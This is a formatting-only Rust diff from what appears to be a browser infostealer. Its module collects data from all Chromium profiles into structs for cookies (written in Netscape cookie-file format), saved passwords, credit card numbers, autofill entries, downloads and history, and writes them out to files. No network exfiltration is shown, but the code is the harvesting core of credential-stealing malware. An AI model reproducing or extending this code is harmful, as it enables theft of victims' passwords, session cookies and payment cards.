@@ -14,19 +14,17 @@ use alloc::vec::Vec;
 use collector::Collector;
 use core::fmt::{Display, Formatter};
 use tasks::Task;
-use tasks::{composite_task, impl_composite_task_runner, CompositeTask};
+use tasks::{CompositeTask, composite_task, impl_composite_task_runner};
 use utils::path::{Path, WriteToFile};
 
 pub struct BrowsersTask<C: Collector> {
-    inner: CompositeTask<C>
+    inner: CompositeTask<C>,
 }
 
 impl<C: Collector + 'static> Default for BrowsersTask<C> {
     fn default() -> Self {
         Self {
-            inner: composite_task!(
-                ChromiumTask::new()
-            )
+            inner: composite_task!(ChromiumTask::new()),
         }
     }
 }
@@ -37,25 +35,24 @@ pub(crate) fn collect_and_read_sqlite_from_all_profiles<P, F, R, T, S>(
     profiles: &[Path],
     path: P,
     table: S,
-    mapper: F
+    mapper: F,
 ) -> Option<Vec<T>>
 where
     P: Fn(&Path) -> R,
     R: AsRef<Path>,
     F: Fn(&dyn TableRecord) -> Option<T>,
     T: Ord,
-    S: AsRef<str>
+    S: AsRef<str>,
 {
     collect_and_read_from_all_profiles(profiles, Databases::Sqlite, path, table, mapper)
 }
-
 
 pub(crate) fn collect_and_read_from_all_profiles<D, P, R, F, T, S>(
     profiles: &[Path],
     db_type: D,
     path: P,
     table: S,
-    mapper: F
+    mapper: F,
 ) -> Option<Vec<T>>
 where
     D: AsRef<Databases>,
@@ -76,11 +73,10 @@ where
     })
 }
 
-
 pub(crate) fn collect_from_all_profiles<F, T>(profiles: &[Path], f: F) -> Option<Vec<T>>
 where
     F: Fn(&Path) -> Option<Vec<T>>,
-    T: Ord
+    T: Ord,
 {
     let mut data: Vec<T> = profiles
         .iter()
@@ -100,10 +96,9 @@ where
 
 pub(crate) fn to_string_and_write_all<T>(data: &[T], sep: &str, dst: &Path) -> Result<(), u32>
 where
-    T: Display
+    T: Display,
 {
-    data
-        .iter()
+    data.iter()
         .map(|it| it.to_string())
         .collect::<Vec<String>>()
         .join(sep)
@@ -124,9 +119,7 @@ where
     let db = db_type.as_ref().read_from_bytes(bytes).ok()?;
     let table = db.read_table(table_name)?;
 
-    let records = table
-        .filter_map(|record| mapper(&record))
-        .collect();
+    let records = table.filter_map(|record| mapper(&record)).collect();
 
     Some(records)
 }
@@ -137,15 +130,15 @@ pub(crate) struct Cookie {
     pub name: Arc<str>,
     pub value: Arc<str>,
     pub path: Arc<str>,
-    pub expires_utc: i64
+    pub expires_utc: i64,
 }
 
 impl Display for Cookie {
     fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
         write!(
-            f, 
-           "{}\tTRUE\t{}\tFALSE\t{}\t{}\t{}\r", 
-           self.host_key, self.path, self.expires_utc, self.name, self.value
+            f,
+            "{}\tTRUE\t{}\tFALSE\t{}\t{}\t{}\r",
+            self.host_key, self.path, self.expires_utc, self.name, self.value
         )
     }
 }
@@ -171,7 +164,7 @@ impl Display for Bookmark {
 pub(crate) struct AutoFill {
     pub name: Arc<str>,
     pub value: Arc<str>,
-    pub last_used: i64
+    pub last_used: i64,
 }
 
 impl Display for AutoFill {
@@ -191,7 +184,7 @@ pub(crate) struct CreditCard {
     pub expiration_month: i64,
     pub expiration_year: i64,
     pub card_number: Arc<str>,
-    pub use_count: i64
+    pub use_count: i64,
 }
 
 impl Display for CreditCard {
@@ -209,7 +202,7 @@ impl Display for CreditCard {
 #[derive(PartialEq, Ord, Eq, PartialOrd)]
 pub(crate) struct Download {
     pub saved_as: Arc<str>,
-    pub url: Arc<str>
+    pub url: Arc<str>,
 }
 
 impl Display for Download {
@@ -227,7 +220,7 @@ impl Display for Download {
 pub(crate) struct Password {
     pub origin: Option<Arc<str>>,
     pub username: Option<Arc<str>>,
-    pub password: Option<Arc<str>>
+    pub password: Option<Arc<str>>,
 }
 
 impl Display for Password {
@@ -248,7 +241,7 @@ impl Display for Password {
 pub(crate) struct History {
     pub url: Arc<str>,
     pub title: Arc<str>,
-    pub last_visit_time: i64
+    pub last_visit_time: i64,
 }
 
 impl Display for History {
@@ -257,8 +250,7 @@ impl Display for History {
             f,
             "Title: {}\n\
             Url: {}",
-            self.title,
-            self.url,
+            self.title, self.url,
         )
     }
 }
